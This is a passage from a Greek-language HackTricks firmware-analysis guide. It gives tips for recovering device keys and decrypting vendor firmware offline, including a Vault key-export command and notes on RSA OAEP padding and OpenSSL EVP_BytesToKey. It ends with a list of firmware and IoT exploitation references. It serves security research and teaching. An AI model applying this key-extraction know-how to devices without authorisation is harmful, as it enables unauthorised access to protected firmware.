- Εξαγάγετε το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Αποτυχία αποκρυπτογράφησης με PKCS#1 v1.5 και αποτυχία της προεπιλεγμένης αποκρυπτογράφησης OAEP **δεν** αποδεικνύουν ότι το key είναι λάθος· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι συνήθεις βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload αρχίζει με `Salted__`, αναπαράγετε ακριβώς το OpenSSL KDF του κατασκευαστή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) προτού επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «κρυπτογραφημένο firmware» γίνεται ένα γενικότερο πρόβλημα: **ανακτήστε τα λειτουργικά keys στην πλευρά της συσκευής και, στη συνέχεια, αναπαράγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.

## Εκπαίδευση και Πιστοποιήσεις

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware με Claude: Δεξιότητες ανώτερου επιπέδου, αυτονομία αρχάριου](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Μεθοδολογία δοκιμών ασφάλειας firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Πρακτικό IoT Hacking: Ο οριστικός οδηγός για επιθέσεις στο Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Εκμετάλλευση zero days σε εγκαταλελειμμένο hardware – blog της Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Πώς μια έξυπνη συσκευή των $20 μού έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Τώρα με βλέπετε: τώρα σας έχω κάνει pwn](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Εκμετάλλευση του Tesla Wall Connector από τη θύρα φόρτισής του - Μέρος 2: παράκαμψη της προστασίας κατά της υποβάθμισης](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Κάντε το να αναβοσβήσει: Εκμετάλλευση μέσω OTA του Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS στο QEMU Μέρος 1: Αποσυσκευασία](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Τεκμηρίωση πυρήνα Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS στο QEMU Μέρος 2: Αποσφαλμάτωση και επιδιόρθωση](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Κωδικοί BIOS της Dell: Η αδύναμη κρυπτογράφηση XOR επιτρέπει την ανάκτηση από SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Εργαλεία ανάκτησης κωδικών BIOS της Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
